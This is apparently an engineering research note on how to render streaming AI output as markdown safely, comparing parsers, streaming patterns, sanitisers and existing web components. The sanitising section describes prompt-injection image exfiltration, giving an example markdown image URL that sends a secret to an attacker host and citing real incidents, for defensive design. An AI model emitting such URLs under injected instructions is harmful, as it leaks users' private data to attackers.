# Research: rendering markdown safely while it streams

Researched on 2026-10-10 for roadmap item #40 (`c2-markdown`, P2). Versions come from `npm view`. Sizes were measured by bundling each entry with the repo's esbuild (`--bundle --minify --format=esm`) and compressing with `gzip -9`. bundlephobia and developer.chrome.com could not be reached from the research container, so the claims about Chrome pages rely on search snippets.

## 1. Parsers

| Package                      | Version, licence | gzip                         | Fit                                                                                                                                                                                                         |
| ---------------------------- | ---------------- | ---------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| marked                       | 18.1.0, MIT      | **13.6 kB**                  | GFM built in. `marked.lexer()` returns a flat list of block tokens, each with its `raw` source, which is exactly what block memoisation needs. Has an extension API. Does not sanitise its own HTML output. |
| micromark (+ GFM)            | 4.0.3, MIT       | 15.7 kB (21.3 kB with GFM)   | 100% CommonMark and safe by default, but it outputs HTML strings or events, not a tree. Getting a tree means adding mdast/unified.                                                                          |
| mdast-util-from-markdown     | 2.1.0, MIT       | 16.5 kB, before GFM          | Gives an mdast tree. This is the remark path that react-markdown and streamdown use, and the unified pipeline adds weight.                                                                                  |
| markdown-it                  | 15.0.2, MIT      | 41.3 kB                      | Strict CommonMark with a rich plugin API and safe link validation, but three times the size of marked.                                                                                                      |
| @lezer/markdown              | 1.8.0, MIT       | 19.9 kB                      | Parses **incrementally** by reusing fragments of the previous tree. Has no HTML renderer and only loose CommonMark conformance. Worth it only for documents over 100 kB.                                    |
| commonmark.js                | 0.31.2, BSD-2    | 48.6 kB                      | The reference implementation, but it has no GFM support.                                                                                                                                                    |
| md4w (md4c compiled to WASM) | 0.2.7, MIT       | 1.7 kB of JS + 27 kB of WASM | Fastest of the group, but the WASM loads asynchronously and the output is an HTML string.                                                                                                                   |

For chat-sized text, parsing costs little next to the DOM work.

## 2. Streaming patterns

| Pattern                                   | Work per chunk                   | Used by                                                                                                      | Problem                                                                               |
| ----------------------------------------- | -------------------------------- | ------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------- |
| Re-parse everything and replace innerHTML | O(n) parse **and** O(n) DOM      | naive implementations                                                                                        | O(n²) over a stream; flicker; loses the text selection; restarts animations           |
| **Block memoisation**                     | O(n) lexing (cheap), O(tail) DOM | Vercel AI SDK cookbook, [streamdown](https://github.com/vercel/streamdown), semidown, @incremark/core        | Re-lexes everything; a link reference defined late can change earlier blocks          |
| Append-only DOM                           | O(chunk)                         | [streaming-markdown](https://github.com/thetarnav/streaming-markdown) (4.5 kB), the Chrome article's example | Cannot take back a wrong guess (a literal `*`, a setext heading); weak tables and GFM |
| Incremental parser                        | O(edit) parse                    | @lezer/markdown                                                                                              | Still needs its own tree-to-DOM diff                                                  |
| Parse off-DOM, then morph the live DOM    | O(n) parse, minimal DOM          | [`<vaadin-markdown>`](https://www.npmjs.com/package/@vaadin/markdown) (`synchronizeNodes`)                   | Diffs the whole document on every chunk                                               |

**Healing unfinished syntax.** streamdown's [`remend`](https://github.com/vercel/streamdown/tree/main/packages/remend) runs over the string before it is parsed:

- It closes an unterminated `**`, `*`/`_`, `` ` ``, `~~` and `$$`. A single `$` is left alone, because it is often a currency sign.
- It rewrites an incomplete link to the placeholder `streamdown:incomplete-link`.
- It drops an incomplete image.

A fence that is still open renders as code, with highlighting deferred until it closes (streamdown's `useIsCodeFenceIncomplete`). A table only appears once its delimiter row has arrived.

**The streamdown props worth matching:**

- `mode: static | streaming` and `parseIncompleteMarkdown`
- `caret: block | circle`
- `animated` (fade or blur in, per word or per character)
- `linkSafety`, `allowedTags`, `shikiTheme: [light, dark]`
- `controls` (copy and download)
- `plugins: { code, math, mermaid }`

**Platform.** Chrome's [render-LLM-responses guide](https://developer.chrome.com/docs/ai/render-llm-responses) makes three points:

- Don't assign innerHTML on every chunk.
- Treat model output as untrusted.
- Sanitise it, and stop the stream if the sanitiser removes anything.

WHATWG `streamHTML`/`streamAppendHTML` ([whatwg/html#11669](https://github.com/whatwg/html/issues/11669)) is not shippable yet.

## 3. Sanitising

- **DOMPurify** 3.4.16, 11.7 kB, supports Trusted Types. It needs a DOM, so it does not run during SSR.
- **HTML Sanitizer API** (`Element.setHTML`) shipped in [Firefox 148](https://hacks.mozilla.org/2026/02/goodbye-innerhtml-hello-sethtml-stronger-xss-protection-in-firefox-148/) (Feb 2026) and [Chrome/Edge 146](https://developer.chrome.com/blog/new-in-chrome-146) (Mar 2026). Safari has not shipped it, so it is not Baseline: feature-detect it.
- **Safe by construction.** Build the output from tokens, put text only into bindings, render only an allowlist of element types, and check every URL with `new URL()` against a protocol allowlist. There is nothing to sanitise because no HTML string is ever produced. react-markdown takes this approach (no raw HTML by default, plus a `urlTransform` hook).

**Image exfiltration** is the real threat for AI output, not script injection. A prompt injection makes the model emit `![](https://attacker/?q=<secret>)` and the browser sends the request. Known cases:

- [ChatGPT, 2023](https://simonwillison.net/2023/Apr/14/new-prompt-injection-attack-on-chatgpt-web-version-markdown-imag/)
- [Bard, 2023](https://simonwillison.net/2023/Nov/4/hacking-google-bard-from-prompt-injection-to-data-exfiltration/)
- [GitHub Copilot Chat, 2024](https://simonwillison.net/2024/Jun/16/github-copilot-chat-prompt-injection/)
- [M365 Copilot "EchoLeak", CVE-2025-32711](https://thehackernews.com/2025/06/zero-click-ai-vulnerability-exposes.html), which got through an allowlisted proxy

Defences:

- Allowlist image origins, or require a click to load.
- Never request a URL that is still streaming.
- Treat an open redirect on an allowed origin as a hole in the allowlist.

## 4. Code, math, diagrams

- **Code.** The repo already ships shiki 4.x through `c2-code-viewer`: `shiki/core`, the JavaScript regex engine, on-demand grammars, a highlighter shared across the page, and plain text first. A markdown fence should become a `c2-code-viewer`, loaded lazily, rather than a second highlighting stack. Highlight a fence only once it has closed ([shiki-stream](https://github.com/antfu/shiki-stream) can stream line by line with recalls, but that adds complexity a chat answer does not need).
- **Math.** [Temml](https://temml.org) 0.14 is 59 kB and outputs MathML, which every engine now supports, with no font CSS. KaTeX 0.19 is 77 kB plus fonts. Either way, load it lazily.
- **Mermaid** 12.x is very large. Load it lazily, and only after its fence has closed.

## 5. Prior-art web components

| Component                                                                                          | Parser and sanitiser                           | Notes                                                                                                                              |
| -------------------------------------------------------------------------------------------------- | ---------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------- |
| [`<wa-markdown>`](https://webawesome.com/docs/components/markdown) (Web Awesome 3.x, experimental) | marked, **no sanitiser**                       | Reads its source from a child `<script type="text/markdown">` and strips common indentation. Its docs warn about XSS.              |
| `<vaadin-markdown>` 25.3                                                                           | marked + DOMPurify                             | Takes a `content` property and renders into **light DOM** so page CSS applies. Streams by morphing the DOM. The closest prior art. |
| [`<zero-md>`](https://github.com/zerodevx/zero-md) 3.1                                             | marked, no sanitiser                           | Fetches its source from `src`. Loads highlight.js, KaTeX and Mermaid from a CDN at runtime. Renders in shadow DOM.                 |
| [md-block](https://github.com/LeaVerou/md-block)                                                   | marked + DOMPurify, opt-in through `untrusted` | Has `hmin`, the heading offset.                                                                                                    |

None of them is both safe by default and built for streaming. That gap is where `c2-markdown` fits.
